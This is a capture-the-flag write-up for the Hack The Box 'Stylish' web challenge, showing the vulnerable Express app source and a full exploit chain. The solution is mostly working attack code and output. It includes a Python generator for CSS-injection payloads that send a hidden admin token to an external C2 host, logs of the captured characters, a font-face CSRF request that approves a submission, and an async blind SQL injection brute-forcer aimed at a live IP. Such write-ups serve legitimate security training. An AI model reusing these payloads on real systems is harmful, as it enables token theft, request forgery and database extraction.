# Web

## Description

A new card generator platform just went live. Apparently everything seems to be good but is it really like this? Find your way in with style!
## Source

`package.json`
```json
{
	"name": "web_stylish",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"scripts": { "start": "node index.js" },
	"keywords": [],
	"authors": [ "Nauten" ],
	"license": "ISC",
	"dependencies": {
		"express": "^4.17.1",
		"nunjucks": "^3.2.0",
		"puppeteer": "^10.4.0",
		"sqlite-async": "1.1.2"
	},
	"devDependencies": { "nodemon": "^2.0.15" }
}
```

```js
const express       = require('express');
const app           = express();
const path          = require('path');
const nunjucks      = require('nunjucks');
const routes        = require('./routes');
const Database      = require('./database');
const TokenHelper   = require('./helpers/TokenHelper')

const db = new Database('web-stylish.db');

app.use(express.json())
app.use(function(req, res, next) {
	res.setHeader("Content-Security-Policy", "default-src 'self'; object-src 'none'; img-src 'self'; style-src 'self'; font-src 'self' *;")
    next();
});

nunjucks.configure('views', { autoescape: true, express: app });

app.set('views', './views');
app.use('/assets', express.static(path.resolve('assets')));
app.use('/card_styles', express.static(path.resolve('card_styles')));
app.use(routes(db));
app.disable('etag');
app.all('*', (req, res) => { return res.status(404).send({ message: '404 page not found' }); });

(async () => {
    await db.connect();
    await db.migrate();

    // Token will not contains any repeated characters
    process.env.approvalToken = TokenHelper.generateToken();
    process.env.rejectToken   = TokenHelper.generateToken();
        
    app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```

`database.js`
```js
const sqlite = require('sqlite-async');
const crypto = require('crypto');

class Database {
    constructor(db_file) {
        this.db_file = db_file;
        this.db = undefined;
    }
    
    async connect() { this.db = await sqlite.open(this.db_file); }

    async migrate() {
        const flagTable = 'flag_' + crypto.randomBytes(4).toString('hex');

        return this.db.exec(`
            PRAGMA case_sensitive_like=ON; 
            
            DROP TABLE IF EXISTS submissions;
            CREATE TABLE IF NOT EXISTS submissions (
                id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                css         TEXT NOT NULL,
                approved    BOOLEAN NOT NULL 
            );

            DROP TABLE IF EXISTS comments;
            CREATE TABLE IF NOT EXISTS comments (
                id               INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                id_submission    INTEGER NOT NULL,
                content          TEXT NOT NULL
            );

            DROP TABLE IF EXISTS ${flagTable};
            CREATE TABLE IF NOT EXISTS ${flagTable} (
                flag          VARCHAR(255) NOT NULL
            );
            
            INSERT INTO ${flagTable} VALUES ('HTB{f4k3_fl4g_f0r_t3st1ng}');
        `);
    }

    async getSubmission(id) {
        return new Promise(async (resolve, reject) => {
            try {
                let stmt = await this.db.prepare("SELECT * FROM submissions WHERE id = ?");
                resolve(await stmt.get(id));
            } catch(e) { reject(e); }
        });
    }

	async insertSubmission(css) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO submissions (css, approved) VALUES (?, 0)');
                resolve((await stmt.run(css).then((result) => { return result.lastID; })));
			} catch(e) { reject(e); }
		});
	}
    
	async updateSubmissionStatus(id, approved) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('UPDATE submissions SET approved = ? WHERE id = ?');
				resolve(await stmt.run(approved, id));
			} catch(e) { reject(e); }
		});
	}

    async deleteSubmission(id) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('DELETE FROM submissions WHERE id = ?');
				resolve(await stmt.run(id));
			} catch(e) { reject(e); }
		});
	}

	async insertComment(submissionID, commentContent) {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('INSERT INTO comments (id_submission, content) VALUES (?, ?)');
                resolve((await stmt.run(submissionID, commentContent).then((result) => { return result.lastID; })));
			} catch(e) { reject(e); }
		});
	}

	async getSubmissionComments(submissionID, pagination=10) {
		return new Promise(async (resolve, reject) => {
			try {
                const stmt = `SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`;
                resolve(await this.db.all(stmt));
			} catch(e) { reject(e); }
		});
	}
}

module.exports = Database;
```

`routes/index.js`
```js
const bot             = require('../bot');
const path            = require('path');
const express         = require('express');
const fs              = require('fs');
const router          = express.Router();

const response = data => ({ message: data });
const isAdmin = req => ((req.ip == '127.0.0.1') ? 1 : 0);

let db;

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/submit.html'));
});

router.get('/view/:id', (req, res) => {
    return db.getSubmission(req.params.id)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));

            const cssFile = `/card_styles/${req.params.id}.css`;
            
            if(submission.approved == 0) {
                // Only admin can view unaccepted submissions
                if(isAdmin(req) == 0)
                    return res.status(403).send(response('This submission has not been reviewed yet'));
                    
                const approvalToken = process.env.approvalToken;        
                const rejectToken = process.env.rejectToken;        
    
                return res.render(path.resolve('views/card_unapproved.html'), {
                    cssFile: cssFile,
                    approvalToken: approvalToken,
                    rejectToken: rejectToken,
                    submissionID: submission.id
                });
            }
            else {
                return db.getSubmissionComments(submission.id)
				.then(comments => {
                    return res.render(path.resolve('views/card_approved.html'), {
                        cssFile: cssFile,
                        submissionID: submission.id,
                        comments: comments
                    });
				})
            }
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
});

router.get('/approve/:id/:approvalToken', (req, res) => {
    if(isAdmin(req) == 0)
        return res.status(403).send(response('Only admin can access this function!'));
    
    return db.getSubmission(req.params.id)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));

            if(process.env.approvalToken == req.params.approvalToken) {
                return db.updateSubmissionStatus(submission.id, 1)
                    .then(()  => {
                        return res.send(response('Submission has been approved!'));
                    })
            }
            else {
                return res.status(403).send(response('Token doesn\'t match!'));
            }
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
});

router.get('/reject/:id/:rejectToken', (req, res) => {
    if(isAdmin(req) == 0)
        return res.status(403).send(response('Only admin can access this function!'));
        
    return db.getSubmission(req.params.id)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));

            if(process.env.rejectToken == req.params.rejectToken) {
                return db.deleteSubmission(submission.id, 1)
                    .then(()  => {
                        fs.unlinkSync(`card_styles/${submission.id}.css`);
                        return res.send(response('Submission has been deleted!'));
                    })
            }
            else {
                return res.status(403).send(response('Token doesn\'t match!'));
            }
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
});

router.post('/api/submission/submit', async (req, res) => {
    const { customCSS } = req.body;

    if(customCSS) {
        return db.insertSubmission(customCSS)
            .then(submissionID => {
                fs.writeFile(`card_styles/${submissionID}.css`, customCSS, function (err) {
                    if (err) return console.log(err);
                });
                bot.visitURL(`http://127.0.0.1:1337/view/${submissionID}`);
                
                return res.send(response(
                    `Your submission (Number ${submissionID}) successfully sent!<br>When approved it will become available <a href="/view/${submissionID}">here</a>`
                ));
            });
    }
    return res.status(403).send(response('CSS code field cannot be empty!'));
});

router.post('/api/comment/submit', async (req, res) => {
    const { submissionID, commentContent } = req.body;

    if(submissionID && commentContent) {
        return db.getSubmission(submissionID)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));

            if(submission.approved == 0) {
                return res.status(403).send(response('This submission has not been reviewed yet'));
            }
            
            return db.insertComment(submissionID, commentContent)
                     .then(commentID => { return res.send(response('Your comment was successfully sent!')); });
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
    }
    return res.status(403).send(response('Comment field and submission ID should be provided!'));
});

router.post('/api/comment/entries', async (req, res) => {
    const { submissionID, pagination } = req.body;

    if(submissionID && pagination) {
        return db.getSubmission(submissionID)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));
            
            if(submission.approved == 0) {
                return res.status(403).send(response('This submission has not been reviewed yet'));
            }

            return db.getSubmissionComments(submissionID, pagination)
				.then(comments => { res.send(comments); })
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
    }
});

module.exports = database => {
	db = database;
	return router;
};
```

## Solution

![stylish.png](/assets/ctf/htb/web/stylish.png)

When we create new CSS code and submit `router.post('/api/submission/submit', ...` endpoint is hit.

The submission creates the file and tells the bot to visit the card style. `insertSubmission` is a prepared query and is returning last inserted item ID, meaning no access to the filename of submission.
```js
db.insertSubmission(customCSS).then(submissionID => {
	fs.writeFile(`card_styles/${submissionID}.css`, customCSS, function (err) { if (err) return console.log(err); });
	bot.visitURL(`http://127.0.0.1:1337/view/${submissionID}`);
```

`visitURL` launches fresh incognito browser for each request, this rules out Cookie Stealer XSS possibility. 
```js
const visitURL = async url => {
	const browser = await puppeteer.launch(browser_options);
	let context = await browser.createIncognitoBrowserContext();
	let page = await context.newPage();
	await page.goto(url, { waitUntil: 'networkidle2' });
	await page.waitForTimeout(7000);
	await browser.close();
};
```

The bot only views the website and makes no additional requests.  
```js
router.get('/view/:id', (req, res) => {
    return db.getSubmission(req.params.id)
        .then(submission => {
            if (submission === undefined) return res.status(404).send(response('Submission does not exist!'));

            const cssFile = `/card_styles/${req.params.id}.css`;
            
            if(submission.approved == 0) {
                // Only admin can view unaccepted submissions
                if(isAdmin(req) == 0)
                    return res.status(403).send(response('This submission has not been reviewed yet'));
                    
                const approvalToken = process.env.approvalToken;        
                const rejectToken = process.env.rejectToken;        
    
                return res.render(path.resolve('views/card_unapproved.html'), {
                    cssFile: cssFile,
                    approvalToken: approvalToken,
                    rejectToken: rejectToken,
                    submissionID: submission.id
                });
            }
            else {
                return db.getSubmissionComments(submission.id)
				.then(comments => {
                    return res.render(path.resolve('views/card_approved.html'), {
                        cssFile: cssFile,
                        submissionID: submission.id,
                        comments: comments
                    });
				})
            }
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
});
```

`getSubmissionComments` is vulnerable to SQLi because of raw query.
```js
async getSubmissionComments(submissionID, pagination=10) {
	return new Promise(async (resolve, reject) => {
		try {
			const stmt = `SELECT content FROM comments WHERE id_submission = ${submissionID} LIMIT ${pagination}`;
			resolve(await this.db.all(stmt));
		} catch(e) { reject(e); }
	});
}
```

`isAdmin` function check if request are made from localhost.
```js
const isAdmin = req => ((req.ip == '127.0.0.1') ? 1 : 0);
```

Looks like we need to abuse the bot to do actions on our behalf via CSRF. To make this work we need to inject Javascript and make bot trigger said Javascript which later with our code will trigger chain of endpoints to finally retrieve flag.

The chain seems to be XSS -> CSRF -> SQLi (???). The flag is located in `flag_{random_4_hex}` table...

First it seems we need to leak the tokens which are used for approval and rejection.

When bot visits the css we created it visits `challenge/views/card_unapproved.html` template.
```html
<!DOCTYPE html>
<head>
	<title>View Card</title>
	<link href="{{ cssFile }}" rel="stylesheet" />
</head>
<body>
	<p id="approvalToken" class="d-none">{{ approvalToken }}</p>
	<p id="rejectToken" class="d-none">{{ rejectToken }}</p>
</body>
```

Our CSS is included into the page, but what can we do with it?

[CSS Injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection) 👀

CSP: [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)

![stylish-1.png](/assets/ctf/htb/web/stylish-1.png)

`challenge/helpers/TokenHelper.js` creates the tokens and all it really does is shuffle ASCII table and return only 32 characters.
```ts
module.exports = {
	generateToken() {
		const dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		const shuffle = v=>[...v].sort(_=>Math.random()-.5).join('');

		// Shuffle characters and sort them in ASCII order
		return shuffle(dict).substring(0, 32).split('').sort().join('');
	}
}
```

Just like HackTricks said the request is made to our server if character exists: [https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-i-ligatures](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-i-ligatures)

![stylish-2.png](/assets/ctf/htb/web/stylish-2.png)

> **Note**: For debug `isAdmin` just returns 1

This doesn't help much, because we need to know where each character is located at to have a proper approval token. Oh btw, tokens have `display: none` and font face won't make request if items are not actually visible.

Actually we don't care about order, because the token is being sorted 💀 If we exfiltrate the "good characters" then we can sort them and that's the token!
```js
module.exports = {
	generateToken() {
		const dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		const shuffle = v=>[...v].sort(_=>Math.random()-.5).join('');

		// Shuffle characters and sort them in ASCII order
		return shuffle(dict).substring(0, 32).split('').sort().join('');
	}
}
```

[HackTricks > CSS Injection > Text node exfiltration (II): leaking the charset with a default font (not requiring external assets)](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font)

After playing around with the PoC I ended up with this script, it's creating almost identical PoC but for this challenge.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Live CSS Editor</title>
        <style>
            body { font-family: Arial, sans-serif; }
            .live-css-editor { width: 100%; height: 640px; padding: 10px; border: 1px solid #ccc; margin-bottom: 20px; font-family: monospace; white-space: pre; }
            #output { border: 1px solid black; padding: 20px; text-align: center; background-color: lightgray; }
            .d-none { display: none; }
            #rejectToken { display: none !important; }
            #approveBtn { display: none !important; }
            #rejectBtn { display: none !important; }
            #responseMsg { display: none !important; }
        </style>
        <style id="injection">
            .d-none { display: block !important; }
        </style>
    </head>
    <body>
        <h2>Live CSS Editor</h2>
        <textarea id="css-editor" class="live-css-editor" placeholder="Type your CSS here..."></textarea>
        <div id="output">
            <p id="approvalToken" class="d-none">123ABC</p>
            <p id="rejectToken" class="d-none">hrtsg243</p>
            <a id="approveBtn" data-id="1" class="btn btn-primary" role="button">Approve submission</a>
            <a id="rejectBtn" data-id="1" class="btn btn-danger" role="button">Reject submission</a>
            <div id="responseMsg"></div>                                                
        </div>
        <script>
            const cssEditor = document.getElementById("css-editor");
            const styleTag = document.getElementById("injection");
            cssEditor.addEventListener("input", function () {
                styleTag.innerHTML = `.d-none { display: block !important; }\n${cssEditor.value}`
            });
        </script>
    </body>
</html>
```

```python
import string

class Defaults:
    BASE = (
        '#approvalToken {'
        '\n    overflow-y: auto; overflow-x: hidden; '
        '\n    height: 40px; width: 0px; '
        '\n    font-size: 0px; letter-spacing: 0px; '
        '\n    word-break: break-all; '
        '\n    font-family: rest; '
        '\n    background: grey; '
        '\n    animation: loop step-end 200s 0s, trychar step-end 2s 0s; '
        '\n    animation-iteration-count: 1, infinite; '
        '\n}'
        '\n.d-none { display: block !important; }'
        '\n#rejectToken { display: none !important; }'
        '\n#approveBtn { display: none !important; }'
        '\n#rejectBtn { display: none !important; }'
        '\n#responseMsg { display: none !important; }'
        '\np::first-line{ font-size: 30px; }'
        '\np::-webkit-scrollbar { background: blue; }'
        '\np::-webkit-scrollbar:vertical { background: blue }\n\n'
    )
    FONT_FACE = "@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}\n"
    KEYFRAME_TRYCHAR = "%s%% { font-family: rest; }\n"

class Templates:
    FONT_FACE = "@font-face{font-family:has_%s;src:url('%s');unicode-range:U+%s;font-style:monospace;}\n"
    KEYFRAME_TRYCHAR = "%s%% { font-family: has_%s, rest;}\n"
    KEYFRAME_LOOP = "%s%% { width: %spx; margin-right: %spx}\n"

CHARSET = string.ascii_letters + string.digits
CHARSET_LEN = len(CHARSET)
TOKEN_LEN = 32
C2 = "http://10.0.2.15"
css = Defaults.BASE

for char in CHARSET:
    css += Templates.FONT_FACE % (char, f'{C2}/?{char}', f'{ord(char):0X}')
css += Defaults.FONT_FACE

css += "\n@keyframes trychar {\n"
step = 100 / (CHARSET_LEN * 2)
perc = step
for i in range(0, CHARSET_LEN):
    css += Templates.KEYFRAME_TRYCHAR % (f'{perc:.2f}', CHARSET[i])
    perc += step
    css += Defaults.KEYFRAME_TRYCHAR % (f'{perc:.2f}')
    perc += step
css += "}\n"

css += "\n@keyframes loop {\n"
for i in range(TOKEN_LEN): 
    css += Templates.KEYFRAME_LOOP % (i, i * 20, i * 20)
css += "}"

print(css)
```

Open the server to catch requests:
```bash
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?C HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?c HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?E HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?k HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?K HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?l HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?L HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?n HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?Q HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?r HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?T HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?u HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?v HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?W HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?w HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:33] "GET /?X HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?z HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?A HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?B HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?b HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?f HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?G HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?h HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?p HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?P HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?1 HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:34] "GET /?3 HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:35] "GET /?5 HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:35] "GET /?6 HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:35] "GET /?7 HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:35] "GET /?8 HTTP/1.1" 200 -
172.17.0.2 - - [19/Sep/2024 12:05:35] "GET /?9 HTTP/1.1" 200 -
```

```python
>>> s='CcEkKlLnQrTuvWwXzABbfGhpP1356789'
>>> ''.join(sorted(list(s))) 
'1356789ABCEGKLPQTWXbcfhklnpruvwz'
```

And now we have acquired Approval Token: `1356789ABCEGKLPQTWXbcfhklnpruvwz`, but for local

For remote I used `ngrok` as server.

Now let's approve the card, but it's better to approve "clean" card. (Exfiltrated request was 8, dummy is 9 and 10 is next request)
```css
/* @font-face { font-family: pwn; src: url(http://CHALLENGE_IP/approve/:id/:approvalToken); } */
@font-face { font-family: pwn; src: url(http://127.0.0.1:1337/approve/9/01279BDEFGIMOQRSTUWZdejlmpqsvwxy); }
#approvalToken ~ * { font-family: pwn; }
```

Now that request has been approved we can view the card and add comments.

![stylish-3.png](/assets/ctf/htb/web/stylish-3.png)

Our real target was SQLi and now that we are here we can exploit it.

```bash
└─$ curl 'http://94.237.62.114:30132/api/comment/entries' -H 'Content-Type: application/json' -d '{"submissionID": "9", "pagination": "10"}'
[{"content":"Hallo!"},{"content":"1"},{"content":"12"},{"content":"3"}]

└─$ curl 'http://94.237.62.114:30132/api/comment/entries' -H 'Content-Type: application/json' -d '{"submissionID": "9", "pagination": "1"}'
[{"content":"Hallo!"}]
```

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name)
**
Bruteforce the flag:
```python
from aiohttp import ClientSession
import asyncio
import string

class Charset:
    TABLE = string.hexdigits
    FLAG = string.punctuation + string.ascii_letters + string.digits

class Payload:
    TABLE = "IIF(SUBSTR((SELECT tbl_name FROM sqlite_master WHERE tbl_name LIKE '{}%'),{},1)='{}',1,0)"
    FLAG = "IIF(SUBSTR((SELECT flag FROM {}),{},1)='{}',1,0)"

URL = 'http://94.237.62.114:30132/api/comment/entries'
SUBMISSION_ID = 9
SUCCESS = 'Hallo!'

async def fetch(session, payload):
    async with session.post(URL, json={'submissionID': SUBMISSION_ID, 'pagination': payload}) as resp:
        text = await resp.text()
        if SUCCESS in text:
            return True
        return False

async def brute(session, known, table, payload, charset):
    while True:
        index = len(known) + 1
        print(f'\r[{index}] {known=}', end='')
        tasks = [
            fetch(session, payload.format(table, index, c))
            for c in charset
        ]
        results = await asyncio.gather(*tasks)
        for i, result in enumerate(results):
            if result:
                known += charset[i] 
                break
        else:
            break

    print(f'\r[{index}] {known=}')
    return known

async def main():
    async with ClientSession() as session:
        table = await brute(session, 'flag_', 'flag_', Payload.TABLE, Charset.TABLE)
        flag = await brute(session, 'HTB{Wh0_S41d_tH4t_c', table, Payload.FLAG, Charset.FLAG)
        print(flag)

if __name__ == '__main__':
    asyncio.run(main()) 
```

```bash
➜ py .\sqli.py
[14] known='flag_118fc3ee'
[52] known='HTB{Wh0_S41d_tH4t_c$$_sh0uld_b3_c0ns1d3r3d_s4Fe??!}'
HTB{Wh0_S41d_tH4t_c$$_sh0uld_b3_c0ns1d3r3d_s4Fe??!}
```